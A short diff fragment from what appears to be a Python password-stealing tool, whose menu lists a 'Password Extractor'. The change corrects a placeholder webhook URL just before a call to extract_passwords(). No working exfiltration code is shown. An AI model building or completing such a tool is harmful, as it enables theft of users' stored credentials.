@@ -186,7 +186,7 @@ class Main():
         print(self.y + '        [3] ' + self.c + '  Password Extractor')
 
 try:
-    WEBHOOK_URL = "WEBHOOCK"
+    WEBHOOK_URL = "WEBHOOK"
 
     extract_passwords()
 
